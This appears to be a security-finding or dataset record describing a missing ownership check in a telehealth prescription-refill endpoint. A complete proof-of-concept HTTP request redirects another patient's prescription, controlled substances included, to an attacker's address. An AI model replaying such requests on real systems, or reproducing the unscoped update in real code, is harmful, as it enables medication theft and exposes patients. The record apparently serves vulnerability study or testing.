diagnosis: The route handler validates parameter formats with fluent-json-schema and enforces patient authentication, but executes a direct update by prescriptionId without constraining the WHERE clause to eq(prescriptionsTable.patientId, req.user.patientId). An attacker can redirect prescription medications and controlled substances of other patients to their own address.
exploit_request:
POST /telehealth/prescriptions/4d7c0f18-d748-472e-839c-512030f9a21b/refill HTTP/1.1
Host: clinic.telehealth-portal.org
Authorization: Bearer <patient_token>
Content-Type: application/json

{"preferredPharmacyNpi": "1982736450", "deliveryAddress": "123 Attacker Lane, Suite 4"}
